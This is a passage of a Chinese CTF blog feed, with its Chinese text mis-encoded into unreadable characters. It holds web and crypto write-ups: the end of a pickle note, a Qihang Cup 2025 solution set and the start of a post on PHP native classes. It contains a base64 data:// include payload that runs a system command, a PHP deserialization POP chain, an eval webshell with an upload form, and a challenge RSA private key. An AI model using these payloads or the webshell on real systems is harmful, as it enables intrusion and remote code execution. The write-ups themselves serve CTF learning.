class="code"><pre><code class="hljs kotlin">animal = INST(<span class="hljs-string">&#x27;__main__&#x27;</span>, <span class="hljs-string">&#x27;Animal&#x27;</span>)<br>animal.name=<span class="hljs-string">&#x27;1&#x27;</span><br>animal.category=<span class="hljs-string">&#x27;2&#x27;</span><br><span class="hljs-keyword">return</span> animal<br></code></pre></td></tr></table></figure><h4 id="æ‰‹åŠ¨è¾…åŠ©"><a href="#æ‰‹åŠ¨è¾…åŠ©" class="headerlink" title="æ‰‹åŠ¨è¾…åŠ©"></a>æ‰‹åŠ¨è¾…åŠ©</h4><ul><li>æ‹¼æ¥opcodeï¼šå°†ç¬¬ä¸€ä¸ªpickleæµç»“å°¾è¡¨ç¤ºç»“æŸçš„<code>.</code>å»æ‰ï¼Œä¸¤è€…æ‹¼æ¥èµ·æ¥å³å¯ã€‚</li><li>å»ºç«‹æ™®é€šçš„ç±»æ—¶ï¼Œå¯ä»¥å…ˆpickle.dumpsï¼Œå†æ‹¼æ¥è‡³payloadã€‚</li></ul><p>å‚è€ƒï¼š</p><p><a href="https://xz.aliyun.com/news/7032">https://xz.aliyun.com/news/7032</a> å…ˆçŸ¥å¤§ä½¬</p><p><a href="https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf">https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf</a> å®˜æ–¹æ–‡æ¡£</p><p><a href="https://tttang.com/archive/1294/">https://tttang.com/archive/1294/</a> Pç¥</p>]]></content>
    
    
    <categories>
      
      <category>çŸ¥è¯†ç‚¹</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pickle</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å¯èˆªæ¯</title>
    <link href="/tuyi/2025/01/25/%E5%90%AF%E8%88%AA%E6%9D%AF/"/>
    <url>/tuyi/2025/01/25/%E5%90%AF%E8%88%AA%E6%9D%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="å¯èˆªæ¯2025-1-25"><a href="#å¯èˆªæ¯2025-1-25" class="headerlink" title="å¯èˆªæ¯2025.1.25"></a>å¯èˆªæ¯2025.1.25</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><p>ä¹Ÿæ˜¯ç¬¬ä¸€æ¬¡æ­£å¼æ¯”èµ›akwebå•Š  å‘œå‘œå‘œ è™½ç„¶å¤šä¸éš¾</p><h3 id="Easy-include"><a href="#Easy-include" class="headerlink" title="Easy_include"></a>Easy_include</h3><p>æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-comment">//flag in flag.php</span><br><span class="hljs-variable">$file</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$file</span>))<br>&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>,<span class="hljs-variable">$file</span>))<br>    &#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;no no no ~ &quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ç®€å•çš„æ–‡ä»¶åŒ…å«</p><p>payload:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">file</span>=data://text/plain<span class="hljs-comment">;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTsgPz4=</span><br></code></pre></td></tr></table></figure><p>ä¼ªåè®®åŠ ç¼–ç ç»•è¿‡</p><h3 id="Web-pop"><a href="#Web-pop" class="headerlink" title="Web_pop"></a>Web_pop</h3><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Start</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$func</span>;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Welcome to QHCTF 2025, &quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;name;<br>    &#125;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__isset</span>(<span class="hljs-params"><span class="hljs-variable">$var</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        (<span class="hljs-variable language_">$this</span>-&gt;func)();<br>    &#125;<br>&#125;<br> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Sec</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$obj</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$var</span>;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;obj-&gt;<span class="hljs-title function_ invoke__">check</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-keyword">var</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;CTFers&quot;</span>;<br>    &#125;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>);<br>    &#125;<br>&#125;<br> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Easy</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cla</span>;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$fun</span>, <span class="hljs-variable">$var</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;cla = <span class="hljs-keyword">clone</span> <span class="hljs-variable">$var</span>[<span class="hljs-number">0</span>];<br>    &#125;<br>&#125;<br> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">eeee</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$obj</span>;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__clone</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;obj-&gt;cmd))&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;success&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br> <br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><p>ç®€å•çš„pop</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Start</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br><br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Sec</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$obj</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Easy</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cla</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$fun</span>, <span class="hljs-variable">$var</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;cla = <span class="hljs-keyword">clone</span> <span class="hljs-variable">$var</span>[<span class="hljs-number">0</span>];<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">eeee</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$obj</span>;<br><br><br>&#125;<br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Start</span>();<br><span class="hljs-variable">$a</span>-&gt;name=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Sec</span>();<br><span class="hljs-variable">$a</span>-&gt;name-&gt;obj=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Easy</span>();<br><span class="hljs-variable">$a</span>-&gt;name-&gt;<span class="hljs-keyword">var</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">eeee</span>();<br><span class="hljs-variable">$a</span>-&gt;name-&gt;<span class="hljs-keyword">var</span>-&gt;obj=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Start</span>();<br><span class="hljs-variable">$a</span>-&gt;name-&gt;<span class="hljs-keyword">var</span>-&gt;obj-&gt;func=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Sec</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><h3 id="PCREMagic"><a href="#PCREMagic" class="headerlink" title="PCREMagic"></a>PCREMagic</h3><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_php</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span>&#123;<br>     <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&lt;\?php.*?eval.*?\(.*?\).*?\?&gt;/is&#x27;</span>, <span class="hljs-variable">$data</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_FILES</span>)) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>));<br>&#125;<br><br><span class="hljs-variable">$user_dir</span> = <span class="hljs-string">&#x27;data/&#x27;</span> . <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]);<br><span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_php</span>(<span class="hljs-variable">$data</span>)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;bad request&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$user_dir</span>)) &#123;<br>        <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$user_dir</span>, <span class="hljs-number">0755</span>, <span class="hljs-literal">true</span>);<br>    &#125;<br>    <span class="hljs-variable">$path</span> = <span class="hljs-variable">$user_dir</span> . <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-title function_ invoke__">random_int</span>(<span class="hljs-number">0</span>, <span class="hljs-number">10</span>) . <span class="hljs-string">&#x27;.php&#x27;</span>;<br>    <span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-variable">$path</span>);<br><br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: <span class="hljs-subst">$path</span>&quot;</span>, <span class="hljs-literal">true</span>, <span class="hljs-number">303</span>);<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>æ–‡ä»¶ä¸Šä¼ ï¼Œä½†æ˜¯è¿‡æ»¤ç”¨çš„æ˜¯éè´ªå©ªè¿‡æ»¤</p><p>ç›´æ¥ç»•è¿‡å°±è¡Œ</p><p>webshell:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span><br>@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;shell&#x27;</span>]);<br><br></code></pre></td></tr></table></figure><p>å†™ä¸ªè¡¨å•ä¸Šä¼ </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;zh-CN&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>æ–‡ä»¶ä¸Šä¼ <span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>ä¸Šä¼ æ–‡ä»¶<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://challenge.qihangcup.cn:33406/&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;</span>é€‰æ‹©æ–‡ä»¶ï¼š<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">required</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span>ä¸Šä¼ æ–‡ä»¶<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p>èšå‰‘ç›´æ¥è¿æ¥å°±è¡Œ</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Easy-RSA"><a href="#Easy-RSA" class="headerlink" title="Easy_RSA"></a>Easy_RSA</h3><p>gptç›´æ¥æœ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> Crypto.PublicKey <span class="hljs-keyword">import</span> RSA<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> PKCS1_OAEP<br><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt_message</span>(<span class="hljs-params">encrypted_message_b64, private_key</span>):<br>    <span class="hljs-comment"># Base64è§£ç åŠ å¯†æ¶ˆæ¯</span><br>    encrypted_message = base64.b64decode(encrypted_message_b64)<br>    <span class="hljs-comment"># å¯¼å…¥ç§é’¥</span><br>    key = RSA.import_key(private_key)<br>    <span class="hljs-comment"># åˆ›å»ºè§£å¯†å™¨</span><br>    cipher = PKCS1_OAEP.new(key)<br>    <span class="hljs-comment"># è§£å¯†å¹¶è¿”å›ç»“æœ</span><br>    <span class="hljs-keyword">return</span> cipher.decrypt(encrypted_message).decode()<br><br><span class="hljs-comment"># ç¬¬äºŒä¸ªç§é’¥ï¼ˆå®é™…èƒ½è§£å¯†çš„ç§é’¥ï¼‰</span><br>private_key = <span class="hljs-string">b&#x27;&#x27;&#x27;-----BEGIN RSA PRIVATE KEY-----</span><br><span class="hljs-string">MIICXQIBAAKBgQCvNhcDwDMhZl3dJt0+gkvu/cQuRFM58aqCDRLfS5bnCMPFXFi8</span><br><span class="hljs-string">aHrYZNC7Tz/DrenOSUCv+d+4sZqjRW8GsbOR8DWK7wNO3SliQ8MmiY2jfF5omPaU</span><br><span class="hljs-string">5OJiGUuAYLbYeIUkvEn6Zf10hmwuaGwku5qgEEPppfaUtleFsOFjdYMbnQIDAQAB</span><br><span class="hljs-string">AoGACZwbXgrMIyBUtJz9lICb/pMvj+QSdoKhOfnSl6mzMJ/D8Q60FT1bw4OgCS37</span><br><span class="hljs-string">DtX6lWRiJmS7lwsyspLL2J+lfBuq2PrES/SRcp4TausDemtRfQVbKmBEcfy0oIn3</span><br><span class="hljs-string">DM7dT4EAhUSI2Z4Y6nX+3yztwQV0ReeYdlg2P8eOprftvVcCQQC3kpHbwv9kHa5N</span><br><span class="hljs-string">z49QFV5W1XHCD4KE3wC1xm/9dWbOMrGkR2v7CIXYoRcD6hg4kv5JzKPOaYYpygqZ</span><br><span class="hljs-string">qRR/uWfPAkEA9FcBpiiB1b7Ozxk7Gz6NF94MQItJ0xTrArArllBheAhIjaDAjX1z</span><br><span class="hljs-string">OQ++RGZVByXVLmPyWJNK93uR0tqQOju00wJACjRIjVnCjpMjzEl8Yuw9KUCGKU5p</span><br><span class="hljs-string">Z+9pf7E/KmyrQU0KGOKrevHXVtpliB8sJ4DsR7frZx7wiUQk4LPIYu0wewJBAIQo</span><br><span class="hljs-string">64NsNY3ffw0VoJrD4p0eRZJDxNKfZd42W90Z7R53nIa+hGgDiuc6VLe6ghMzq3NE</span><br><span class="hljs-string">LDksskfaVq2t+oUE9nECQQCptxk0oH5dwDttlWa0esz9V+HdMY4tQlvUuHUwCY9D</span><br><span class="hljs-string">slrK1kk630BceGayC2TYOvfdco7iui5HYIJ4W5ff3RRB</span><br><span class="hljs-string">-----END RSA PRIVATE KEY-----&#x27;&#x27;&#x27;</span><br><br><span class="hljs-comment"># ç¬¬äºŒä¸ªåŠ å¯†æ¶ˆæ¯ï¼ˆå®é™…èƒ½è§£å¯†çš„æ¶ˆæ¯ï¼‰</span><br>encrypted_msg = <span class="hljs-string">&quot;UpyynVxi3qhqCLRI+lsKnLZ4QrXmUCnmh8fRUR4yHbl49I2CnlwBmKtbOKKcXQCKBMrZ2sedeh7UiVBth5peL0IarRC/GHevnZOF2Bw48E5g5DAzzMsotqnDV0NZpKMuqyXtSeqm9I/gMUKzbPzBtwmmGQ66vCjswrdXghcmUc4=&quot;</span><br><br><span class="hljs-comment"># è§£å¯†å¹¶è¾“å‡º</span><br>decrypted = decrypt_message(encrypted_msg, private_key)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;è§£å¯†ç»“æœ:&quot;</span>, decrypted)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>æ¯æ—¥ä¸€web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>æ¯”èµ›</tag>
      
      <tag>æ–‡ä»¶åŒ…å«</tag>
      
      <tag>phpååºåˆ—åŒ–</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHPåŸç”Ÿç±»</title>
    <link href="/tuyi/2025/01/24/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB/"/>
    <url>/tuyi/2025/01/24/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB/</url>
    
    <content type="html"><![CDATA[<p>æœ¬æ–‡ä»‹ç»phpå¸¸ç”¨çš„åŸç”Ÿç±»</p><p>åœ¨phpä¸­åªè¦å‡½æ•°åå’Œå‚æ•°å¯æ§ï¼Œé‚£ä¹ˆä½¿ç”¨phpåŸç”Ÿç±»ä¼šæœ‰å¾ˆå¤§ä½œç”¨</p><blockquote><p>å‰æï¼š<code>php.ini</code> ä¸­é€šè¿‡ <code>disable_classes</code> é™åˆ¶</p></blockquote><h1 id="ç›®å½•æ‰«æ"><a href="#ç›®å½•æ‰«æ" class="headerlink" title="ç›®å½•æ‰«æ"></a>ç›®å½•æ‰«æ</h1><h2 id="DirectoryIterator"><a href="#DirectoryIterator" class="headerlink" title="DirectoryIterator"></a><strong>DirectoryIterator</strong></h2><p>ç”¨æ³•ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">ä¼ å…¥è·¯å¾„è¿›è¡Œæ‰«æ<br><span class="hljs-variable">$dir</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&#x27;/path/to/directory&#x27;</span>);<br>å¯é…åˆglobä¼ªåè®®è¿›è¡Œç²¾ç¡®è¯»å–<br><span class="hljs-variable">$dir</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&#x27;glob:///f*&#x27;</span>); è¯»å–æ ¹ç›®å½•ä¸‹ä»¥få¼€å¤´çš„æ–‡ä»¶<br></code></pre></td></tr></table></figure><blockquote><p>ä¸€èˆ¬æƒ…å†µä¸èƒ½éå†è¾“å‡ºé‚£ä¹ˆå°±åªèƒ½è¾“å‡ºä¸€ä¸ª</p></blockquote><h2 id="FilesystemIterator"><a href="#FilesystemIterator" class="headerlink" title="FilesystemIterator"></a><strong>FilesystemIterator</strong></h2><p>ä¸DirectoryIteratorç›¸æ¯”å…·æœ‰æ›´å¥½çš„æ€§èƒ½ï¼Œç”¨æ³•å…¶å®æ˜¯ä¸€æ ·çš„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">ä¼ å…¥è·¯å¾„è¿›è¡Œæ‰«æ<br><span class="hljs-variable">$dir</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&#x27;/path/to/directory&#x27;</span>);<br>å¯é…åˆglobä¼ªåè®®è¿›è¡Œç²¾ç¡®è¯»å–<br><span class="hljs-variable">$dir</span> = <span 